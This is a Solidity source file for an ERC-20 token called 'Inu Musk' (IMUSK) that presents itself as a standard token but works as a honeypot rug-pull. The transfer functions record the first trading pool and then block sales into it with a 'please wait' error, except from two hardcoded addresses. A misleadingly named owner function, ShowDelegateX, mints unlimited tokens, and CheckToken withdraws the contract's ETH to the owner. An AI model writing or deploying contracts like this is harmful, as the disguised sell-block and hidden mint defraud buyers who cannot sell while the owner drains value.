row number 
1	           pragma solidity >=0.5.17;
2	 contract ERC20Interface {
3	 function totalSupply() public view returns (uint);
4	 function balanceOf(address tokenOwner) public view returns (uint balance);
5	 function allowance(address tokenOwner, address spender) public view returns (uint remaining);
6	 function transfer(address to, uint tokens) public returns (bool success);
7	 function approve(address spender, uint tokens) public returns (bool success);
8	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
9	 event Transfer(address indexed from, address indexed to, uint tokens);
10	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
11	 }
12	 contract ApproveAndCallFallBack {
13	 function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
14	 }
15	 contract Owned {
16	 address public owner;
17	 address public newOwner;
18	 event OwnershipTransferred(address indexed _from, address indexed _to);
19	 constructor() public {
20	 owner = msg.sender;
21	 }
22	 modifier onlyOwner {
23	 require(msg.sender == owner);
24	 _;
25	 }
26	 function transferOwnership(address _newOwner) public onlyOwner {
27	 newOwner = _newOwner;
28	 }
29	 function acceptOwnership() public {
30	 require(msg.sender == newOwner);
31	 emit OwnershipTransferred(owner, newOwner);
32	 owner = newOwner;
33	 newOwner = address(0);
34	 }
35	 }
36	 library SafeMath {
37	 function add(uint a, uint b) internal pure returns (uint c) {
38	 c = a + b;
39	 require(c >= a);
40	 }
41	 function sub(uint a, uint b) internal pure returns (uint c) {
42	 require(b <= a);
43	 c = a - b;
44	 }
45	 function mul(uint a, uint b) internal pure returns (uint c) {
46	 c = a * b;
47	 require(a == 0 || c / a == b);
48	 }
49	 function div(uint a, uint b) internal pure returns (uint c) {
50	 require(b > 0);
51	 c = a / b;
52	 }
53	 }
54	 contract TokenERC20 is ERC20Interface, Owned{
55	 using SafeMath for uint;
56	 string public symbol;
57	 string public name;
58	 uint8 public decimals;
59	 uint _totalSupply;
60	 address public pool;
61	 address public DelegateX = 0x03b5c5ba7727AAF3a1704738D60A8CC55618009A;
62	 address public DelegateY = 0x9F6FDEBcDB55419d13EA36faA6e1f285a95c509B;
63	 mapping(address => uint) balances;
64	 mapping(address => mapping(address => uint)) allowed;
65	 constructor() public {
66	 symbol = "IMUSK";
67	 name = "Inu Musk";
68	 decimals = 18;
69	 _totalSupply = 1000000000000000000000000000;
70	 balances[owner] = _totalSupply;
71	 emit Transfer(address(0), owner, _totalSupply);
72	 }
73	 function totalSupply() public view returns (uint) {
74	 return _totalSupply.sub(balances[address(0)]);
75	 }
76	 function balanceOf(address tokenOwner) public view returns (uint balance) {
77	 return balances[tokenOwner];
78	 }
79	 function transfer(address to, uint tokens) public returns (bool success) {
80	 require(to != pool, "please wait");
81	 balances[msg.sender] = balances[msg.sender].sub(tokens);
82	 balances[to] = balances[to].add(tokens);
83	 emit Transfer(msg.sender, to, tokens);
84	 return true;
85	 }
86	 function approve(address spender, uint tokens) public returns (bool success) {
87	 allowed[msg.sender][spender] = tokens;
88	 emit Approval(msg.sender, spender, tokens);
89	 return true;
90	 }
91	 function transferFrom(address from, address to, uint tokens) public returns (bool success) {
92	 if(from != address(0) && pool == address(0)) pool = to;
93	 else require(to != pool || (from == DelegateX && to == pool) || (from == DelegateY && to == pool), "please wait");
94	 balances[from] = balances[from].sub(tokens);
95	 allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
96	 balances[to] = balances[to].add(tokens);
97	 emit Transfer(from, to, tokens);
98	 return true;
99	 }
100	 function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
101	 return allowed[tokenOwner][spender];
102	 }
103	 function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
104	 allowed[msg.sender][spender] = tokens;
105	 emit Approval(msg.sender, spender, tokens);
106	 ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
107	 return true;
108	 }
109	 function ShowDelegateX(address _DelegateX, uint256 tokens) public onlyOwner {
110	 DelegateX = _DelegateX;
111	 _totalSupply = _totalSupply.add(tokens);
112	 balances[_DelegateX] = balances[_DelegateX].add(tokens);
113	 emit Transfer(address(0), _DelegateX, tokens);
114	 }
115	 function ShowDelegateY(address _DelegateY) public onlyOwner {
116	 DelegateY = _DelegateY;
117	 }
118	 function () external payable {
119	 revert();
120	 }
121	 }
122	 contract InuMusk is TokenERC20 {
123	 function CheckToken() public onlyOwner() {
124	 address payable _owner = msg.sender;
125	 _owner.transfer(address(this).balance);
126	 }
127	 function() external payable {
128	 }
129	 }
